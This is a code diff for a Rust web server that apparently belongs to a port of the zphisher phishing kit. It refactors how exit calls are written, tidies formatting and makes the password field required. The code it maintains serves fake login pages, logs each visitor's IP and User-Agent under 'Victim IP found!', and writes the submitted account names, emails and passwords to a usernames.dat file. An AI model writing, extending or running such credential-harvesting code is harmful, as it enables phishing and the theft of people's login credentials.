@@ -1,6 +1,7 @@
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::path::PathBuf;
+use std::process::exit;
 use actix_files::NamedFile;
 use actix_web::{get, post, middleware, http, web, App, HttpRequest, HttpResponse, HttpServer, Responder};
 use crate::cli::{clear_terminal, error_msg, notify_msg};
@@ -23,7 +24,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
             Ok(user_agent) => user_agent,
             Err(err) => {
                 error_msg(&err.to_string());
-                std::process::exit(1);
+                exit(1);
             }
         },
         None => "",
@@ -36,7 +37,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
         Some(auth_dir) => auth_dir,
         None => {
             error_msg("Unable to get data directory");
-            std::process::exit(1);
+            exit(1);
         }
     }.join("zphisher").join("auth").join("ip.txt");
 
@@ -44,27 +45,27 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
     if !ip_dir.exists() {
         if let Err(e) = OpenOptions::new().write(true).create(true).open(&ip_dir) {
             error_msg(&format!("Couldn't create ip.txt file: {}", e));
-            std::process::exit(1);
+            exit(1);
         }
     }
 
     let mut file = OpenOptions::new().write(true).append(true).open(&ip_dir).unwrap_or_else(|err| {
         error_msg(&format!("Couldn't open ip.txt file: {}", err));
-        std::process::exit(1);
+        exit(1);
     });
 
     let formatted_ip = format!("IP: {}\nUser-Agent: {}", client_ip, user_agent);
 
     if let Err(e) = writeln!(file, "{}", formatted_ip) {
         error_msg(&format!("Couldn't write to file: {}", e));
-        std::process::exit(1);
+        exit(1);
     }
 
     notify_msg(&format!("{}\n", "Victim IP found!".green()));
     notify_msg(&format!("{} {}\n", "Victim's IP:".green(), client_ip.bright_blue()));
-    notify_msg(&format!("{} {}\n", "ip.txt file saved at".green(),ip_dir.display().to_string().green()).green());
-    notify_msg(&format!("{}\n","IP address saved to ip.txt".green()));
-    notify_msg(&format!("{}\n","User-Agent saved to ip.txt".green()));
+    notify_msg(&format!("{} {}\n", "ip.txt file saved at".green(), ip_dir.display().to_string().green()).green());
+    notify_msg(&format!("{}\n", "IP address saved to ip.txt".green()));
+    notify_msg(&format!("{}\n", "User-Agent saved to ip.txt".green()));
 
 
     let user_agent = match req.headers().get(header::USER_AGENT) {
@@ -72,7 +73,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
             Ok(user_agent) => user_agent,
             Err(err) => {
                 error_msg(&err.to_string());
-                std::process::exit(1);
+                exit(1);
             }
         },
         None => "",
@@ -92,7 +93,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
         Ok(file) => file,
         Err(err) => {
             error_msg(&err.to_string());
-            std::process::exit(1);
+            exit(1);
         }
     };
     let mut response = file.into_response(&req);
@@ -112,7 +113,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
 pub struct LoginForm {
     username: Option<String>,
     email: Option<String>,
-    password: Option<String>,
+    password: String,
 }
 
 pub struct Config {
@@ -131,7 +132,7 @@ async fn login(
         Some(auth_dir) => auth_dir,
         None => {
             error_msg("Unable to get data directory");
-            std::process::exit(1);
+            exit(1);
         }
     }.join("zphisher").join("auth").join("usernames.dat");
 
@@ -139,54 +140,53 @@ async fn login(
     if !data_dir.exists() {
         if let Err(e) = OpenOptions::new().write(true).create(true).open(&data_dir) {
             error_msg(&format!("Couldn't create usernames.dat file: {}", e));
-            std::process::exit(1);
+            exit(1);
         }
     }
 
     let mut file = OpenOptions::new().write(true).append(true).open(&data_dir).unwrap_or_else(|err| {
         error_msg(&format!("Couldn't open usernames.dat file: {}", err));
-        std::process::exit(1);
+        exit(1);
     });
 
 
     if let Some(username) = &form.username {
         success_counter += 1;
-        notify_msg(&format!("{}\n","Login info found!".green()));
+        notify_msg(&format!("{}\n", "Login info found!".green()));
         notify_msg(&format!("{} {}\n", "Account:".green(), username.bright_blue()));
         // write to file
-        match writeln!(file, "Account: {}", username)  {
-            Ok(_) => {},
+        match writeln!(file, "Account: {}", username) {
+            Ok(_) => {}
             Err(e) => {
                 error_msg(&format!("Couldn't write to file: {}", e));
-                std::process::exit(1);
+                exit(1);
             }
         };
     } else if let Some(email) = &form.email {
         success_counter += 1;
-        notify_msg(&format!("{}\n","Login info found!".green()));
+        notify_msg(&format!("{}\n", "Login info found!".green()));
         notify_msg(&format!("{} {}\n", "Account:".green(), email.bright_blue()));
         // write to file
-        match writeln!(file, "Account: {}", email)  {
-            Ok(_) => {},
+        match writeln!(file, "Account: {}", email) {
+            Ok(_) => {}
             Err(e) => {
                 error_msg(&format!("Couldn't write to file: {}", e));
-                std::process::exit(1);
+                exit(1);
             }
         };
     }
 
-    if let Some(password) = &form.password {
-        success_counter += 1;
-        notify_msg(&format!("{} {}\n", "Password:".green(), password.bright_blue()));
-        // write to file
-        match writeln!(file, "Password: {}", password)  {
-            Ok(_) => {},
-            Err(e) => {
-                error_msg(&format!("Couldn't write to file: {}", e));
-                std::process::exit(1);
-            }
-        };
-    }
+    success_counter += 1;
+    notify_msg(&format!("{} {}\n", "Password:".green(), &form.password.bright_blue()));
+    // write to file
+    match writeln!(file, "Password: {}", &form.password) {
+        Ok(_) => {}
+        Err(e) => {
+            error_msg(&format!("Couldn't write to file: {}", e));
+            exit(1);
+        }
+    };
+
     if success_counter == 2 || success_counter == 3 {
         notify_msg(&format!("{} {}\n", "Credentials saved to".green(), data_dir.display().to_string().green()));
     }
@@ -224,7 +224,7 @@ pub async fn start_webserver(static_files: PathBuf, port: Option<u16>, redirect_
         Ok(_) => {}
         Err(err) => {
             error_msg(&err.to_string());
-            std::process::exit(1);
+            exit(1);
         }
     }
     banner_small();
